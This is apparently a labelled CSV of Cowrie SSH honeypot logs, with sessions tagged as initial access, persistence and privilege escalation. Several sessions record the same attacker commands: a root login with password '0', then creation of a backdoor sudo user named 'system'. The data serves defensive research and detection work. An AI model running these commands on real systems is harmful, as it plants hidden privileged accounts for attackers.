,event,session_id,session,labels
330,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/6d4c716d4ffd3292dffbb38fd6204382fe2050003193c20bbcfc157b2215109d after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""6d4c716d4ffd3292dffbb38fd6204382fe2050003193c20bbcfc157b2215109d"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T21:47:23.456246Z"", ""ttylog"": ""var/lib/cowrie/tty/6d4c716d4ffd3292dffbb38fd6204382fe2050003193c20bbcfc157b2215109d"", ""session_id"": ""e727afe0e8ab""}",e727afe0e8ab,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 uDavXcHP) system  && sudo usermod -aG sudo system ; openssl passwd -1 uDavXcHP;,"['Initial access', 'Persistence', 'Privilege escalation']"
331,"{""duration"": ""1.1"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 1.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T21:47:23.456835Z"", ""session_id"": ""e727afe0e8ab""}",e727afe0e8ab,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 uDavXcHP) system  && sudo usermod -aG sudo system ; openssl passwd -1 uDavXcHP;,"['Initial access', 'Persistence', 'Privilege escalation']"
332,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:29175 (10.42.6.15:2222) [session: 6dcdbb4edee3]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 29175.0, ""timestamp"": ""2025-08-06T11:42:54.939018Z"", ""session_id"": ""6dcdbb4edee3""}",6dcdbb4edee3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 XdmE2sbk) system  && sudo usermod -aG sudo system ; openssl passwd -1 XdmE2sbk;,"['Initial access', 'Persistence', 'Privilege escalation']"
333,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T11:42:54.940713Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""6dcdbb4edee3""}",6dcdbb4edee3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 XdmE2sbk) system  && sudo usermod -aG sudo system ; openssl passwd -1 XdmE2sbk;,"['Initial access', 'Persistence', 'Privilege escalation']"
334,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T11:42:54.960039Z"", ""session_id"": ""6dcdbb4edee3""}",6dcdbb4edee3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 XdmE2sbk) system  && sudo usermod -aG sudo system ; openssl passwd -1 XdmE2sbk;,"['Initial access', 'Persistence', 'Privilege escalation']"
335,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T11:42:55.022476Z"", ""username"": ""root"", ""session_id"": ""6dcdbb4edee3""}",6dcdbb4edee3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 XdmE2sbk) system  && sudo usermod -aG sudo system ; openssl passwd -1 XdmE2sbk;,"['Initial access', 'Persistence', 'Privilege escalation']"
336,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T11:42:55.435895Z"", ""session_id"": ""6dcdbb4edee3""}",6dcdbb4edee3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 XdmE2sbk) system  && sudo usermod -aG sudo system ; openssl passwd -1 XdmE2sbk;,"['Initial access', 'Persistence', 'Privilege escalation']"
337,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 XdmE2sbk) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 XdmE2sbk) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T11:42:55.436483Z"", ""session_id"": ""6dcdbb4edee3""}",6dcdbb4edee3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 XdmE2sbk) system  && sudo usermod -aG sudo system ; openssl passwd -1 XdmE2sbk;,"['Initial access', 'Persistence', 'Privilege escalation']"
338,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 XdmE2sbk"", ""message"": ""CMD: openssl passwd -1 XdmE2sbk"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T11:42:55.437026Z"", ""session_id"": ""6dcdbb4edee3""}",6dcdbb4edee3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 XdmE2sbk) system  && sudo usermod -aG sudo system ; openssl passwd -1 XdmE2sbk;,"['Initial access', 'Persistence', 'Privilege escalation']"
339,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 XdmE2sbk"", ""message"": ""Command not found: openssl passwd -1 XdmE2sbk"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T11:42:55.437845Z"", ""session_id"": ""6dcdbb4edee3""}",6dcdbb4edee3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 XdmE2sbk) system  && sudo usermod -aG sudo system ; openssl passwd -1 XdmE2sbk;,"['Initial access', 'Persistence', 'Privilege escalation']"
340,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/f36b40ffe42ce3cf77abe6dc1405d08606588c2ee1af4fa85e14fc74e4edb490 after 0.1 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""f36b40ffe42ce3cf77abe6dc1405d08606588c2ee1af4fa85e14fc74e4edb490"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T11:42:55.490765Z"", ""ttylog"": ""var/lib/cowrie/tty/f36b40ffe42ce3cf77abe6dc1405d08606588c2ee1af4fa85e14fc74e4edb490"", ""session_id"": ""6dcdbb4edee3""}",6dcdbb4edee3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 XdmE2sbk) system  && sudo usermod -aG sudo system ; openssl passwd -1 XdmE2sbk;,"['Initial access', 'Persistence', 'Privilege escalation']"
341,"{""duration"": ""0.6"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.6 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T11:42:55.492822Z"", ""session_id"": ""6dcdbb4edee3""}",6dcdbb4edee3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 XdmE2sbk) system  && sudo usermod -aG sudo system ; openssl passwd -1 XdmE2sbk;,"['Initial access', 'Persistence', 'Privilege escalation']"
342,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:12630 (10.42.4.33:2222) [session: 592a2751969a]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 12630.0, ""timestamp"": ""2025-08-05T10:13:42.456640Z"", ""session_id"": ""592a2751969a""}",592a2751969a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 gQPJsDxT) system  && sudo usermod -aG sudo system ; openssl passwd -1 gQPJsDxT;,"['Initial access', 'Persistence', 'Privilege escalation']"
343,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T10:13:42.552857Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""592a2751969a""}",592a2751969a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 gQPJsDxT) system  && sudo usermod -aG sudo system ; openssl passwd -1 gQPJsDxT;,"['Initial access', 'Persistence', 'Privilege escalation']"
344,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T10:13:42.700201Z"", ""session_id"": ""592a2751969a""}",592a2751969a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 gQPJsDxT) system  && sudo usermod -aG sudo system ; openssl passwd -1 gQPJsDxT;,"['Initial access', 'Persistence', 'Privilege escalation']"
345,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T10:13:43.057046Z"", ""username"": ""root"", ""session_id"": ""592a2751969a""}",592a2751969a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 gQPJsDxT) system  && sudo usermod -aG sudo system ; openssl passwd -1 gQPJsDxT;,"['Initial access', 'Persistence', 'Privilege escalation']"
346,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T10:13:43.282761Z"", ""session_id"": ""592a2751969a""}",592a2751969a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 gQPJsDxT) system  && sudo usermod -aG sudo system ; openssl passwd -1 gQPJsDxT;,"['Initial access', 'Persistence', 'Privilege escalation']"
347,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 gQPJsDxT) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 gQPJsDxT) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T10:13:43.283116Z"", ""session_id"": ""592a2751969a""}",592a2751969a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 gQPJsDxT) system  && sudo usermod -aG sudo system ; openssl passwd -1 gQPJsDxT;,"['Initial access', 'Persistence', 'Privilege escalation']"
348,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 gQPJsDxT"", ""message"": ""CMD: openssl passwd -1 gQPJsDxT"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T10:13:43.283631Z"", ""session_id"": ""592a2751969a""}",592a2751969a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 gQPJsDxT) system  && sudo usermod -aG sudo system ; openssl passwd -1 gQPJsDxT;,"['Initial access', 'Persistence', 'Privilege escalation']"
349,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 gQPJsDxT"", ""message"": ""Command not found: openssl passwd -1 gQPJsDxT"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T10:13:43.284267Z"", ""session_id"": ""592a2751969a""}",592a2751969a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 gQPJsDxT) system  && sudo usermod -aG sudo system ; openssl passwd -1 gQPJsDxT;,"['Initial access', 'Persistence', 'Privilege escalation']"
350,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/530bff4b1469025c98cae2a254bd8658e57047025747025b6e5561cb4ed76d89 after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""530bff4b1469025c98cae2a254bd8658e57047025747025b6e5561cb4ed76d89"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T10:13:43.389169Z"", ""ttylog"": ""var/lib/cowrie/tty/530bff4b1469025c98cae2a254bd8658e57047025747025b6e5561cb4ed76d89"", ""session_id"": ""592a2751969a""}",592a2751969a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 gQPJsDxT) system  && sudo usermod -aG sudo system ; openssl passwd -1 gQPJsDxT;,"['Initial access', 'Persistence', 'Privilege escalation']"
351,"{""duration"": ""0.9"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.9 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T10:13:43.389749Z"", ""session_id"": ""592a2751969a""}",592a2751969a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 gQPJsDxT) system  && sudo usermod -aG sudo system ; openssl passwd -1 gQPJsDxT;,"['Initial access', 'Persistence', 'Privilege escalation']"
352,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:50898 (10.42.4.33:2222) [session: ed2972581688]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 50898.0, ""timestamp"": ""2025-08-13T08:32:57.638384Z"", ""session_id"": ""ed2972581688""}",ed2972581688,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 QPyUEHja) system  && sudo usermod -aG sudo system ; openssl passwd -1 QPyUEHja;,"['Initial access', 'Persistence', 'Privilege escalation']"
353,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T08:32:57.638819Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""ed2972581688""}",ed2972581688,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 QPyUEHja) system  && sudo usermod -aG sudo system ; openssl passwd -1 QPyUEHja;,"['Initial access', 'Persistence', 'Privilege escalation']"
354,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T08:32:57.742639Z"", ""session_id"": ""ed2972581688""}",ed2972581688,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 QPyUEHja) system  && sudo usermod -aG sudo system ; openssl passwd -1 QPyUEHja;,"['Initial access', 'Persistence', 'Privilege escalation']"
355,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T08:32:58.055541Z"", ""username"": ""root"", ""session_id"": ""ed2972581688""}",ed2972581688,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 QPyUEHja) system  && sudo usermod -aG sudo system ; openssl passwd -1 QPyUEHja;,"['Initial access', 'Persistence', 'Privilege escalation']"
356,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T08:32:58.278656Z"", ""session_id"": ""ed2972581688""}",ed2972581688,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 QPyUEHja) system  && sudo usermod -aG sudo system ; openssl passwd -1 QPyUEHja;,"['Initial access', 'Persistence', 'Privilege escalation']"
357,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 QPyUEHja) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 QPyUEHja) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T08:32:58.279052Z"", ""session_id"": ""ed2972581688""}",ed2972581688,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 QPyUEHja) system  && sudo usermod -aG sudo system ; openssl passwd -1 QPyUEHja;,"['Initial access', 'Persistence', 'Privilege escalation']"
